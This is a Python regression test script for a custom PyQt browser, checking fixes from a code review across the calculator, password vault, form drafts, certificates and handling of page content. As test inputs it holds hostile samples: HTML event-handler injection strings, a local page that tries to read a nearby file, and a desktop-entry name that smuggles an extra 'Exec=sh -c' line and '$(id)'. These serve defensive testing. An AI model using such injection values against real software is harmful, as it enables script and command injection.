"""Bugs found by the 2026-11 line-by-line review, one check each.

Plain functions of browser.py where possible, so most of this needs no
window. Nothing here touches your data (see harness.boot)."""
import json, sys
import time as _time
import harness as H

B = H.boot()
RESULTS = []


def check(name, cond, extra=""):
    RESULTS.append((bool(cond), name))
    print(("  ok   " if cond else "  FAIL ") + name
          + (("  <%s>" % extra) if extra else ""))


# -- the bar's calculator: a power of a power must not blow up ----------
for expr in ("((9^64)^64)^2", "(((9^64)^64)^64)", "(9^64)^64"):
    try:
        got = B._calc_answer(expr)
        check("calc %s answers or declines without raising" % expr,
              got is None or isinstance(got, tuple), got)
    except Exception as e:
        check("calc %s answers or declines without raising" % expr,
              False, repr(e)[:80])
check("calc still does 12*64", B._calc_answer("12*64") == ("= 768", "768"))
check("calc still does 2^10", B._calc_answer("2^10") == ("= 1024", "1024"))

# -- a bad debug port in the config must not stop the start ---------------
for bad in ("abc", 99999, [1], -5):
    B.CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
    B.CONFIG_FILE.write_text(json.dumps({"debugPort": True,
                                         "debugPortNumber": bad}))
    try:
        flags = B._startup_flags()
        check("debugPortNumber=%r still starts" % (bad,),
              "--remote-debugging-port=9222" in flags, flags)
    except Exception as e:
        check("debugPortNumber=%r still starts" % (bad,), False, repr(e)[:80])
B.CONFIG_FILE.write_text(json.dumps({"debugPort": True,
                                     "debugPortNumber": 9333}))
check("a good debug port is kept",
      "--remote-debugging-port=9333" in B._startup_flags())
B.CONFIG_FILE.unlink()

# -- a VS Code theme with short colours imports them, not Mocha's -------
got = B.kitty_colours(json.dumps({"colors": {
    "editor.background": "#123", "editor.foreground": "#ffffffcc",
    "focusBorder": "#zzzzzz", "button.background": "#0a0B0c"}}))
check("VS Code import: #rgb becomes #rrggbb", got.get("bg") == "#112233", got)
check("VS Code import: alpha dropped", got.get("text") == "#ffffff", got)
check("VS Code import: a bad colour is skipped for the next name",
      got.get("accent") == "#0a0b0c", got)

# -- a vault key that never reached the disk is not handed out -----------
import tempfile as _tempfile
from pathlib import Path as _Path
_kdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_real_atomic = B._write_atomic
B._write_atomic = lambda path, data: False      # the disk says no
try:
    lock = B.VaultLock(_kdir)
    got = lock._plain_key()
    check("vault key: an unwritten key is not used", got is None, got)
    check("vault key: and no half file is left",
          not (_kdir / "passwords.key").exists())
finally:
    B._write_atomic = _real_atomic
lock = B.VaultLock(_kdir)
k1 = lock._plain_key()
check("vault key: a written key is 32 bytes and on disk",
      k1 is not None and len(k1) == 32
      and (_kdir / "passwords.key").read_bytes() == k1)
check("vault key: and stays the same next time", lock._plain_key() == k1)

# -- switching the master password off never writes {} over a vault -----
_mdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
ml = B.VaultLock(_mdir)
ml.write({"items": [{"host": "x", "password": "keep-me"}]})
check("master: switched on", ml.enable("correct horse battery"))
raw = (_mdir / "passwords.json").read_bytes()
(_mdir / "passwords.json").write_bytes(raw[:-1] + bytes([raw[-1] ^ 1]))
check("master: off is refused while the body does not open",
      ml.disable() is False)
check("master: and the vault is still the sealed one",
      (_mdir / "passwords.json").read_bytes()[:4] == B.MASTER_MAGIC)
(_mdir / "passwords.json").write_bytes(raw)
check("master: off works on a sound vault", ml.disable() is True)
check("master: with everything still in it",
      "keep-me" in json.dumps(B.VaultLock(_mdir).read()))

# -- 1Password: an id that is really an option never reaches op ----------
opp = B.OnePasswordProvider(_kdir)
ran = []
opp._run = lambda args, want_json=True, stdin=None: (ran.append(args)
                                                     or (False, "x"))
for bad in ("--vault=other", "-h", "a b", ""):
    opp.details(bad); opp.totp(bad); opp.delete(bad)
    opp.put({"id": bad or "-", "remote": True, "type": "login"})
check("1Password: option-shaped ids never run op",
      not [a for a in ran if a[:2] in (["item", "get"], ["item", "delete"],
                                       ["item", "edit"])], ran[:3])
opp.details("abc123")
check("1Password: a real id still does", ran and ran[-1][2] == "abc123", ran)

# -- one junk number in a vault row must not stop the vault loading -------
for d in ({"items": [{"used": "abc"}]}, {"entries": [{"host": "x.com",
                                                      "used": "zz"}]},
          {"items": [{"history": [{"password": "a", "when": "x"}]}]},
          {"version": "new"}, {"items": [{"type": "apikey",
                                          "expires": "soon"}]}):
    try:
        got = B.PasswordVault.migrate(d)
        check("vault migrate survives %r" % (d,), isinstance(got, dict))
    except Exception as e:
        check("vault migrate survives %r" % (d,), False, repr(e)[:60])

# -- a malformed Bitwarden export is read as far as it goes, never raises -
_bdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
bv = B.PasswordVault(_bdir)
odd = {"items": [{"type": [1], "name": "a.example",
                  "login": {"uris": {"0": "x"}, "password": "p1"}},
                 {"type": 1, "name": "b.example", "fields": "nope",
                  "login": {"uris": [{"uri": "https://b.example/"}],
                            "username": "me", "password": "p2"}}]}
try:
    n = bv.import_bitwarden(json.dumps(odd))
    check("Bitwarden import: odd rows do not raise, good rows land", n == 2,
          n)
except Exception as e:
    check("Bitwarden import: odd rows do not raise, good rows land", False,
          repr(e)[:80])

# -- our own CSV export comes back through "import a file" unchanged ------
_cdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
cv = B.PasswordVault(_cdir)
cv.set_entry("c.example", "https", "me", "=SUM(1)")
cv.set_entry("d.example", "https", "you", "plain")
import csv as _csv, io as _io
buf = _io.StringIO()
_csv.writer(buf).writerows(cv.export_rows())
cv2 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
cv2.import_rows(buf.getvalue())
got = {(e["host"], e["password"]) for e in cv2.logins()}
check("CSV round trip: a formula-looking password survives",
      ("c.example", "=SUM(1)") in got, got)
check("CSV round trip: a plain one too", ("d.example", "plain") in got, got)

# -- the updater's "set my changes aside" keeps every file ----------------
import subprocess as _sp
_repo = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_g = lambda *a: _sp.run(["git", *a], cwd=str(_repo), capture_output=True)
_g("init", "-q"); _g("config", "user.email", "t@example.invalid")
_g("config", "user.name", "t")
(_repo / "a.txt").write_text("one")
(_repo / "b c.txt").write_text("two")
_g("add", "."); _g("commit", "-qm", "x")
(_repo / "a.txt").write_text("one EDITED")          # " M a.txt", first line
(_repo / "b c.txt").write_text("two EDITED")
(_repo / "\u00fc.txt").write_text("untracked umlaut")
_real_app = B.APP_DIR
B.APP_DIR = _repo
try:
    sub = B.Bridge(None)._stash_uncommitted()
finally:
    B.APP_DIR = _real_app
saved = _repo / (sub or "missing")
check("updater stash: it went ahead", bool(sub), sub)
check("updater stash: the first edited file is kept",
      (saved / "a.txt").exists() and
      (saved / "a.txt").read_text() == "one EDITED")
check("updater stash: a name with a space is kept",
      (saved / "b c.txt").exists())
check("updater stash: an untracked umlaut name is kept",
      (saved / "\u00fc.txt").exists())

# -- the Minecraft ping never raises, whatever the server sends ---------
import socket as _socket, threading as _threading


def _fake_mc(answer):
    srv_sock = _socket.socket()
    srv_sock.bind(("127.0.0.1", 0))
    srv_sock.listen(1)

    def serve():
        c, _ = srv_sock.accept()
        try:
            c.recv(4096)
            body = json.dumps(answer).encode()
            pkt = b"\x00" + B._varint(len(body)) + body
            c.sendall(B._varint(len(pkt)) + pkt)
        finally:
            c.close()
            srv_sock.close()
    _threading.Thread(target=serve, daemon=True).start()
    return srv_sock.getsockname()[1]


for answer in ([], 7, {"players": "lots"}, {"players": {"online": "x"}},
               {"description": {"extra": 5}}, {"version": "1.21"}):
    port = _fake_mc(answer)
    try:
        got = B.mc_ping("127.0.0.1", port, timeout=2)
        check("mc_ping survives %r" % (answer,), isinstance(got, dict), got)
    except Exception as e:
        check("mc_ping survives %r" % (answer,), False, repr(e)[:80])
port = _fake_mc({"players": {"online": 3, "max": 20},
                 "version": {"name": "1.21"}, "description": "hi"})
got = B.mc_ping("127.0.0.1", port, timeout=2)
check("mc_ping still reads a real answer",
      got.get("up") and got.get("players") == 3 and got.get("motd") == "hi",
      got)

# -- page-controlled text in a message box renders as itself --------------
from PyQt6.QtGui import QTextDocument as _QTD
_doc = _QTD()
_raw = '<font size=1>tiny</font> & "x"\nline two.user.js'
_doc.setHtml(B.literal(_raw))
check("literal(): markup comes out as the characters typed",
      _doc.toPlainText().replace("\u2029", "\n") == _raw,
      repr(_doc.toPlainText()))
import ast as _ast
_tree = _ast.parse(open(B.__file__, encoding="utf-8").read())
_plugin = [n for n in _ast.walk(_tree) if isinstance(n, _ast.Call)
           and getattr(n.func, "attr", "") == "question"
           and any(isinstance(a, _ast.Constant) and a.value == "Install plugin?"
                   for a in n.args)]
check("the install-plugin question wraps its page-made text",
      _plugin and isinstance(_plugin[0].args[2], _ast.Call)
      and getattr(_plugin[0].args[2].func, "id", "") == "literal")

# -- window-level checks ---------------------------------------------------
app = H.app()
srv = H.Server({
    "/urltext": "<title>u</title><p id=t>see https://a.example/x and "
                "&lt;img src=x onerror=&quot;window.pwned=1&quot;&gt; too</p>",
    "/boldtext": "<title>b</title><p id=t>Hello reader "
                 "&lt;img src=x onerror=&quot;window.pwned2=1&quot;&gt; "
                 "a&lt;i&gt;b</p>",
    "/code": "<title>c</title><pre id=c>// a comment \"quoted\" 42\n"
             "var s = \"text\"; x = f(3); # hash &lt;b&gt;</pre>",
    "/drafts": "<title>d</title><input id=n name=note>"
               "<input id=cc name=card autocomplete=cc-number>",
    "/quoteid": "<title>q</title><input id='a\"b'><label for='x'>x</label>"
                "<input id=x>",
    "/repo/blob/main/README.md": "<title>gh</title><nav id=site>menu</nav>"
                                 "<article id=readme><h1>Hi</h1></article>",
    "/timers": "<title>t</title><script>window.ticks=0;"
                "setInterval(function(){window.ticks++},20)</script>",
    "/drive-torrent": "<title>dt</title><script>"
                      "location.href='/files/thing.torrent'</script>",
    "/drive-meta": "<title>dm</title><meta http-equiv=refresh "
                   "content='0;url=/files/meta.torrent'>",
    "/twhome": "<title>tw</title><p>home</p>",
    "/twother": "<title>other</title><p id=other>somewhere else</p>",
    "/sneaky": "<title>s</title><form>"
               "<input id=full name=fullname autocomplete=name>"
               "<input id=mail name=email type=email>"
               "<input id=street name=street autocomplete=street-address "
               "style='position:absolute;left:-9999px'>"
               "<input id=tel name=phone type=tel style='opacity:0'>"
               "<input id=zip name=zip autocomplete=postal-code "
               "style='width:1px;height:1px;padding:0;border:0'>"
               "<div style='height:0;overflow:hidden'>"
               "<input id=city name=city autocomplete=address-level2></div>"
               "<div style='opacity:0'><input id=country name=country "
               "autocomplete=country-name></div>"
               "</form>",
    "/checkout2": "<title>c2</title><form>"
                  "<textarea id=msg></textarea>"
                  "<input id=num name=cardnumber>"
                  "<input name=cvc placeholder=CVC>"
                  "<label for=ib>IBAN</label><input id=ib>"
                  "<input name=otp_code>"
                  "<textarea class=t1></textarea>"
                  "<textarea class=t2></textarea></form>",
    "/auth/panel": "<title>panel</title><p>you are in</p>",
    "/blockme": "<title>bm</title><p id=b>served</p>",
    "/notif": "<title>n</title><script>window.asked='';"
              "Notification.requestPermission().then(function(r){"
              "window.asked=r})</script>",
    "/setck": "<title>ck</title><script>document.cookie='srv=1; path=/'"
              "</script>",
    "/imgauth": "<title>i</title><p>a page with a frame</p><script>"
                "var i=document.createElement('iframe');"
                "i.src=location.protocol+'//localhost:'"
                "+location.port+'/auth/panel';"
                "document.body.appendChild(i)</script>"})
br = B.Browser()
br.show()
H.spin(300)
view = br.current()

# the request interceptor is there from the start, ad blocking or not:
# blocked addresses, his headers, the per-site agent and Sec-GPC all
# live in it
H.spin(300)
check("the request interceptor is in place at start-up",
      getattr(br, "_req_watch", None) is not None)

# a local .html cannot read the files beside it
_fdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_fdir / "secret.txt").write_text("TOPSECRET")
(_fdir / "evil.html").write_text(
    "<script>var x=new XMLHttpRequest();try{x.open('GET','secret.txt',"
    "false);x.send();window.got=x.responseText}catch(e){"
    "window.got='blocked'}</script>")
H.load(view, B.QUrl.fromLocalFile(str(_fdir / "evil.html")).toString())
H.spin(1500)
check("a local page cannot read another local file",
      H.js(view, "window.got") != "TOPSECRET", H.js(view, "window.got"))

# an epub's chapter cannot run script in the reader
import zipfile as _zip
_book = _fdir / "evil.epub"
with _zip.ZipFile(str(_book), "w") as z:
    z.writestr("ch1.xhtml", "<html><body><h1>One</h1><p>text</p>"
               "<details open ontoggle=\"window.pwned3=1\">x</details>"
               "<svg onload=\"window.pwned4=1\"></svg></body></html>")
br.open_epub(str(_book), view=view)
H.spin(1500)
check("epub: the chapter text is there",
      "text" in (H.js(view, "document.body.innerText") or ""))
check("epub: its event handlers never run",
      H.js(view, "window.pwned3 === undefined && window.pwned4 === undefined"))

# the page menu's Freeze: the page's own timers must stop
H.load(view, srv.url("/timers"))
H.spin(500)
br.page_tool("freeze", view=view)
H.spin(300)
H.js(view, "window.later=0;setTimeout(function(){window.later=1},10);"
           "window.base=window.ticks")
H.spin(600)
check("Freeze stops the page's running interval",
      H.js(view, "window.ticks-window.base") == 0,
      H.js(view, "window.ticks-window.base"))
check("Freeze stops a timer the page sets afterwards",
      H.js(view, "window.later") == 0)
br.page_tool("thaw", view=view)
H.spin(200)
H.js(view, "window.later2=0;setTimeout(function(){window.later2=1},10)")
H.spin(300)
check("Thaw gives the page its timers back", H.js(view, "window.later2") == 1)

# clickable addresses: the page's own text must stay text
br.config["nav"] = {"clickableUrls": True}
br.refresh_nav()
H.load(view, srv.url("/urltext"))
H.spin(1500)
check("clickable URLs: the address became a link",
      H.js(view, "document.querySelectorAll('#t a.__navurl').length") == 1)
check("clickable URLs: text that looks like markup is not run",
      H.js(view, "window.pwned === undefined && "
                 "!document.querySelector('#t img')"))
check("clickable URLs: the words around it are kept",
      "onerror" in (H.js(view, "document.getElementById('t').textContent")
                    or ""))
br.config["nav"] = {}
br.refresh_nav()

# keep drafts: an ordinary box is kept, a card number is not
H.load(view, srv.url("/drafts"))
H.spin(800)
H.click(view, "#n"); H.type_text(view, "hello")
H.click(view, "#cc"); H.type_text(view, "4111111111111111")
H.spin(300)
drafts = H.js(view, "sessionStorage.getItem('__formdraft') || ''") or ""
check("drafts: the ordinary box is kept", "hello" in drafts, drafts)
check("drafts: the card number is not", "4111" not in drafts, drafts)

# bold word starts (accessibility): the page's text must stay text
br.config["a11y"] = {"boldStarts": True}
br.refresh_a11y()
H.load(view, srv.url("/boldtext"))
H.spin(1500)
check("bold starts: words got their bold start",
      (H.js(view, "document.querySelectorAll('#t b').length") or 0) >= 2)
check("bold starts: text that looks like markup is not run",
      H.js(view, "window.pwned2 === undefined && "
                 "!document.querySelector('#t img')"))
check("bold starts: the text reads the same",
      H.js(view, "document.getElementById('t').textContent")
      == 'Hello reader <img src=x onerror="window.pwned2=1"> a<i>b')
# the audit survives an input id with a quote in it
H.load(view, srv.url("/quoteid"))
H.spin(1000)
audit = H.js(view, "(function(){try{return JSON.stringify("
                   "window.__a11yAudit())}catch(e){return 'threw '+e}})()",
             B.APP_WORLD_ID)
check("a11y audit survives a quote in an id",
      bool(audit) and not str(audit).startswith("threw"), audit)
br.config["a11y"] = {}
br.refresh_a11y()

# code highlighting: colours only, the code itself unchanged
H.load(view, srv.url("/code"))
H.spin(800)
before = H.js(view, "document.getElementById('c').textContent")
br.read_page_tool("highlight", view=view)
H.spin(500)
after = H.js(view, "document.getElementById('c').textContent")
check("highlight: coloured something",
      (H.js(view, "document.querySelectorAll('#c span').length") or 0) > 0)
check("highlight: the code reads exactly as before", before == after,
      repr(after)[:160])

# private tabs: never bookmarked by "bookmark all", never lost by "aside"
H.load(view, srv.url("/timers"))
pv2 = br.new_private_tab()
H.load(pv2, srv.url("/urltext"))
H.spin(800)
before = len(br.bookmarks)
br.bookmark_all_tabs()
check("bookmark all tabs skips the private one",
      not any("/urltext" in (e.get("url") or "") for e in br.bookmarks),
      [e.get("url") for e in br.bookmarks[before:]])
br.set_aside()
check("putting tabs aside leaves the private tab open",
      pv2 in [v for _i, v in br._real_tabs()])
br.close_tab(br.tabs.indexOf(pv2), ask=False)
br.bring_back_aside(0)
H.spin(300)

# a desktop entry cannot be talked into a second Exec line
_entry = br.write_desktop_entry("https://x.example/%F0?a=$(id)",
                                "Evil\nExec=sh -c touch_pwned")
_text = _Path(_entry).read_text() if _entry else ""
_execs = [l for l in _text.splitlines() if l.startswith("Exec=")]
check("desktop entry: one Exec line, the name's newline is gone",
      len(_execs) == 1 and "touch_pwned" not in _execs[0], _execs)
check("desktop entry: % doubled and $ escaped in Exec",
      "%%F0" in _execs[0] and "\\$(id)" in _execs[0], _execs)

# "forget this site" forgets that site and no other
br.history = [{"url": "https://x.com/a", "title": "x", "t": 1},
              {"url": "https://www.netflix.com/b", "title": "n", "t": 2},
              {"url": "https://sub.x.com/c", "title": "s", "t": 3}]
br.config["permissions"] = {"https://x.com:443|MediaAudioCapture": True,
                            "https://netflix.com:443|Notifications": True}
br.known_hosts = {"x.com", "netflix.com"}
br.forget_site("x.com")
left = sorted(e["url"] for e in br.history)
check("forget x.com keeps netflix.com history",
      left == ["https://www.netflix.com/b"], left)
check("forget x.com keeps netflix.com permissions",
      list(br.config["permissions"]) == ["https://netflix.com:443|Notifications"],
      br.config["permissions"])
check("forget x.com keeps netflix.com in the bar's memory",
      br.known_hosts == {"netflix.com"}, br.known_hosts)

# "clear site data" really takes the cookies away
view = br.new_tab()
H.spin(500)
H.load(view, srv.url("/timers"))
H.spin(500)
H.js(view, "document.cookie='keepme=1; path=/; max-age=3600'")
H.spin(300)
br.clear_site_data("127.0.0.1")
H.spin(2500)
_jar = H.js(view, "document.cookie") or ""
check("clear site data removes the site's cookie", "keepme" not in _jar,
      _jar)

# a page cannot drive the chrome with events it made up
br.config["vimKeys"] = True
br.config["mouse"] = {"superDrag": True, "swipeNav": True}
br.refresh_nav()
v1 = br.new_tab(); H.spin(300)
H.load(v1, srv.url("/urltext")); H.spin(900)
before_tabs = len(br._real_tabs())
H.js(v1, "['g','t'].forEach(function(k){document.dispatchEvent("
         "new KeyboardEvent('keydown',{key:k,bubbles:true}))});"
         "var a=document.querySelector('a')||document.body;"
         "a.dispatchEvent(new DragEvent('dragstart',{bubbles:true}));"
         "document.dispatchEvent(new WheelEvent('wheel',{deltaX:200,"
         "bubbles:true,cancelable:true}))")
br._gesture_tick()
H.spin(800)
check("synthetic gt does not switch his tab", br.current() is v1)
check("synthetic dragstart opens no tab",
      len(br._real_tabs()) == before_tabs, len(br._real_tabs()))
br.config["vimKeys"] = False
br.config["mouse"] = {}
br.refresh_nav()

# a bookmarklet bound to a key runs
br.bookmarks.append({"id": 99999, "type": "link", "title": "BoundOne",
                     "url": "", "js": "window.boundRan=1", "parent": 0,
                     "icon": "", "t": 1})
v2 = br.new_tab(); H.spin(300)
H.load(v2, srv.url("/timers")); H.spin(600)
check("a bookmarklet bound to a key runs",
      br.run_bound_script("BoundOne", view=v2) is True)
H.spin(300)
check("...and really ran in the page", H.js(v2, "window.boundRan") == 1)
br.bookmarks = [b for b in br.bookmarks if b.get("id") != 99999]

# a private tab leaves no places behind in the config
pv3 = br.new_private_tab(); H.spin(300)
H.load(pv3, srv.url("/timers")); H.spin(600)
br.config["readResume"] = True
check("private: no video place is noted", br.note_media_place(pv3) is False)
check("private: no reading place is noted",
      br.note_reading_place(pv3) is False)
check("private: no pdf place is noted", br.note_pdf_place(pv3) is False)
br.config["readResume"] = False
br.close_tab(br.tabs.indexOf(pv3), ask=False)

# stopping the camera on one site revokes that site's grants only
br.config["permissions"] = {
    "https://x.com:443|MediaAudioVideoCapture": True,
    "https://netflix.com:443|MediaVideoCapture": True}
v4 = br.new_tab(); H.spin(200)
v4.url = lambda: B.QUrl("https://x.com/call")      # what the tab is on
br.stop_media_use(v4)
check("stop media: the site's own mic+camera grant is taken back",
      "https://x.com:443|MediaAudioVideoCapture" not in br.config["permissions"],
      br.config["permissions"])
check("stop media: netflix.com keeps its grant",
      "https://netflix.com:443|MediaVideoCapture" in br.config["permissions"])
del v4.url

# a trusted certificate is trusted exactly, not every certificate for the host
class _Cert:
    def __init__(self, der): self._der = der
    def toDer(self): return self._der
class _Err:
    def __init__(self, der):
        self._chain = [_Cert(der)]
    def url(self): return B.QUrl("https://printer.lan/")
    def description(self): return "self-signed"
    def isOverridable(self): return True
    def certificateChain(self): return self._chain
_ask = B.QMessageBox.question
_asked = []
B.QMessageBox.question = staticmethod(
    lambda *a, **k: (_asked.append(1), B.QMessageBox.StandardButton.Yes)[1])
try:
    br.config["certExceptions"] = {}
    check("cert: first one is asked and trusted",
          br.certificate_error(_Err(b"cert-one")) is True and len(_asked) == 1)
    check("cert: the same one again is not asked",
          br.certificate_error(_Err(b"cert-one")) is True and len(_asked) == 1)
    B.QMessageBox.question = staticmethod(
        lambda *a, **k: (_asked.append(1), B.QMessageBox.StandardButton.No)[1])
    check("cert: a DIFFERENT one for the same host is asked again",
          br.certificate_error(_Err(b"cert-two")) is False and len(_asked) == 2,
          len(_asked))
finally:
    B.QMessageBox.question = _ask
    br.config["certExceptions"] = {}

# the selection bar: a page cannot forge a press on it
br.config["readSelBar"] = True
v5 = br.new_tab(); H.spin(300)
H.load(v5, srv.url("/urltext")); H.spin(600)
br.read_page_tool("selbar", view=v5); H.spin(300)
from PyQt6.QtGui import QGuiApplication as _QGA
_QGA.clipboard().setText("mine")
H.js(v5, "window.__selWanted={what:'copy',text:'attacker-text'};"
         "var b=document.querySelector('button[data-what=copy]');"
         "if(b)b.dispatchEvent(new MouseEvent('mousedown',{bubbles:true}))")
br._selection_bar_tick(); H.spin(600)
check("selection bar: a page cannot set the clipboard through it",
      _QGA.clipboard().text() == "mine", _QGA.clipboard().text())
br.config["readSelBar"] = False

# the window lock: nothing runs behind it, and it covers the whole window
br.show(); br.new_tab(); H.spin(400)      # earlier blocks closed tabs
br.set_browser_lock("open sesame")
check("locked: the lock goes up", br.lock_browser() and br.locked_now())
H.spin(200)
br._guarded_run("history", br.toggle_history)()
H.spin(500)
check("locked: a shortcut does not open a pane over the lock",
      not br.pane_open(), str(br.pane_open()))
br.resize(br.width() + 200, br.height() + 120); H.spin(300)
_cov = br._lock_cover
check("locked: still locked after the shortcut", _cov is not None)
check("locked: the cover follows the window size",
      _cov is not None and _cov.geometry() == br.rect(),
      str((_cov.geometry() if _cov else None, br.rect())))
br.unlock_browser()
br._guarded_run("history", br.toggle_history)()
H.spin(500)
check("unlocked (control): the same shortcut does open the pane",
      br.pane_open(), str((br.isVisible(), br._pane and br._pane.name,
                           br._pane and br._pane.isVisible())))
br.set_browser_lock("")
br.close_pane()

# a private tab's notification is not written into the config
class _Note:
    def origin(self): return B.QUrl("https://chat.example/")
    def title(self): return "secret title"
    def message(self): return "secret body"
    def show(self): pass
    def close(self): pass
br.config["notifyLog"] = []
br.config["desktopNotify"] = False
br._web_notification(_Note(), private=True)
check("private notification: nothing in the log",
      not br.config.get("notifyLog"), br.config.get("notifyLog"))
br._web_notification(_Note())
check("normal notification: still logged",
      len(br.config.get("notifyLog") or []) == 1)
br.config["notifyLog"] = []

# a web page whose address ends in .md is a web page, not a file to render
v6 = br.new_tab(); H.spin(300)
H.load(v6, srv.url("/repo/blob/main/README.md")); H.spin(1500)
check("an HTML page at a .md address keeps its own markup",
      H.js(v6, "!!document.getElementById('site') && "
               "!!document.getElementById('readme')"))

# saving subtitles twice keeps both files (into a scratch folder: the
# harness does not move the download folder, and his is not ours)
br.config["downloadDir"] = str(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_rows = [{"t": 1, "e": 2, "text": "one"}]
_a = br.save_subtitles(_rows)
_b = br.save_subtitles(_rows)
check("a second export does not replace the first",
      _a and _b and _a != _b and _Path(_a).exists() and _Path(_b).exists(),
      str((_a, _b)))
for _f in (_a, _b):
    try:
        _Path(_f).unlink()
    except OSError:
        pass

# a page cannot hand an address to another program by itself: a script's
# location.href or a meta refresh to a .torrent has to be asked about
_handed, _asked, _answer = [], [], [False]
br._torrent_program = lambda: "/bin/true"
br._ts3_program = lambda: "/bin/true"
br.torrent_handoff = lambda u: (_handed.append(str(u)), True)[1]
br.ts3_open = lambda u: (_handed.append(str(u)), True)[1]
br._ask_handoff = lambda kind, target, site: (
    _asked.append((kind, site)), _answer[0])[1]
br.config["handoffSites"] = {}
v7 = br.new_tab(); H.spin(300)
H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
check("a script's .torrent does not start the torrent client by itself",
      not _handed, str(_handed))
check("...the page has to ask",
      _asked == [("torrent", "127.0.0.1")], str(_asked))
del _asked[:]
_answer[0] = True
H.load(v7, srv.url("/drive-torrent")); H.spin(1200)
check("a yes hands it over",
      len(_handed) == 1 and _handed[0].endswith("/files/thing.torrent"),
      str(_handed))
check("...and is not remembered without the tick",
      not br.config.get("handoffSites"), str(br.config.get("handoffSites")))
del _handed[:], _asked[:]
_answer[0] = False
br.config["handoffSites"] = {"torrent@127.0.0.1": True}
H.load(v7, srv.url("/drive-meta")); H.spin(2000)
check("a site he always allows is not asked again",
      len(_handed) == 1 and not _asked, str((_handed, _asked)))
br.config["handoffSites"] = {}
del _handed[:], _asked[:]
v7.load(B.QUrl(srv.url("/files/typed.torrent"))); H.spin(1000)
check("an address the browser itself loads is not asked about",
      len(_handed) == 1 and not _asked, str((_handed, _asked)))
for _name in ("_torrent_program", "_ts3_program", "torrent_handoff",
              "ts3_open", "_ask_handoff"):
    br.__dict__.pop(_name, None)

# the multistream grid is built once, not over every later page
br.MULTISTREAM_HOME = srv.url("/twhome")
v9 = br.multistream(["abcd"])
H.wait_for(lambda: H.js(v9, "document.querySelectorAll('iframe').length")
           == 1, 6000)
check("multistream builds its grid",
      H.js(v9, "document.querySelectorAll('iframe').length") == 1)
check("...embedded for the page it is built on",
      "parent=127.0.0.1" in str(H.js(v9, "document.querySelector('iframe')"
                                         ".src")))
H.load(v9, srv.url("/twother")); H.spin(1200)
check("the next page in that tab is left as it is",
      H.js(v9, "!!document.getElementById('other') && "
               "document.querySelectorAll('iframe').length === 0"))

# a host that only contains discord.com is not Discord
check("subdomain counts as the host", br._host_is("ptb.discord.com",
                                                   "discord.com"))
check("a look-alike host does not",
      not br._host_is("notdiscord.com", "discord.com")
      and not br._host_is("discord.com.example.net", "discord.com"))
br.config["discordRoute"] = True
v10 = br.new_tab(); H.spin(300)
H.load(v10, srv.url("/twhome")); H.spin(600)
check("a link to x127.0.0.1.invalid is not routed into the 127.0.0.1 tab",
      br.discord_route("http://x127.0.0.1.invalid/", host="127.0.0.1")
      is False)
br.config["discordRoute"] = False

# an address fill goes only into boxes he can see
v11 = br.new_tab(); H.spin(300)
H.load(v11, srv.url("/sneaky")); H.spin(600)
_got = []
br.form_tool("fillident", view=v11, then=_got.append, arg={
    "fullname": "Ada Tester", "email": "ada@example.com",
    "phone": "+49 30 1", "street": "Teststr. 5", "city": "Berlin",
    "zip": "10115", "country": "Germany"})
H.wait_for(lambda: _got, 4000)
_vals = H.js(v11, "JSON.stringify(['full','mail','street','tel','zip','city',"
                  "'country'].map(function(i){return document"
                  ".getElementById(i).value}))")
check("the boxes he can see are filled",
      _vals and '"Ada Tester","ada@example.com"' in _vals, _vals)
check("off-screen, see-through, 1px and clipped boxes stay empty",
      _vals and _vals.endswith('"","","","",""]'), _vals)

# a card is not typed into a page that sends it in the clear
check("https is a place for a card",
      br._card_safe_url("https://shop.example/pay"))
check("this machine is too", br._card_safe_url("http://127.0.0.1:8000/")
      and br._card_safe_url("http://localhost/"))
check("plain http elsewhere is not",
      not br._card_safe_url("http://shop.example/pay"))
_said = []
_flash = br.flash
br.flash = lambda text, *a, **k: _said.append(str(text))
v12 = br.new_tab(); H.spin(300)
v12.load(B.QUrl("http://shop.invalid/pay")); H.spin(1500)
br.fill_card(view=v12, cvv="1")
br.flash = _flash
check("filling a card there is refused, and says why",
      _said == [br._ui_str("cardInsecure")], str(_said))

# a form draft never keeps a card number, a security code, an IBAN or a
# one-time code, and it goes back into the box it came from
import json as _json
br.config["formDraftsOn"] = True
v13 = br.new_tab(); H.spin(300)
H.load(v13, srv.url("/checkout2")); H.spin(600)
H.js(v13, "document.getElementById('msg').value='Long message here';"
          "document.getElementById('num').value='4111111111111111';"
          "document.querySelector('[name=cvc]').value='987';"
          "document.getElementById('ib').value='DE89370400440532013000';"
          "document.querySelector('[name=otp_code]').value='654321';"
          "document.querySelector('.t2').value='second box';")
_saved = []
br.save_form_draft(view=v13, then=_saved.append)
H.wait_for(lambda: _saved, 4000)
_disk = _json.dumps(br.config.get("formDrafts"))
check("the draft keeps the message", "Long message here" in _disk, _disk)
check("...but no card number, code, IBAN or one-time code",
      not any(x in _disk for x in ("4111111111111111", '"987"',
                                   "DE89370400440532013000", "654321")),
      _disk)
H.load(v13, srv.url("/checkout2")); H.spin(1200)
_back = []
br.restore_form_draft(view=v13, then=_back.append)
H.wait_for(lambda: _back, 4000)
H.spin(200)
check("a box with no name gets its own text back, not its neighbour's",
      H.js(v13, "document.querySelector('.t1').value") == ""
      and H.js(v13, "document.querySelector('.t2').value") == "second box",
      str((H.js(v13, "document.querySelector('.t1').value"),
           H.js(v13, "document.querySelector('.t2').value"))))
br.config["formDrafts"] = {"shop.example/pay": {"when": 1, "rows": [
    {"key": "#cardnumber", "value": "4111"},
    {"key": "input[name=otp_code]", "value": "1"},
    {"key": "#msg", "value": "keep me"}]}}
br.config["formHistory"] = {"shop.example": {"cvc": ["123"],
                                             "city": ["Berlin"]}}
br._scrub_secret_rows()
check("drafts already on disk lose their card rows",
      br.config["formDrafts"]["shop.example/pay"]["rows"]
      == [{"key": "#msg", "value": "keep me"}],
      str(br.config["formDrafts"]))
check("...and the form history its codes",
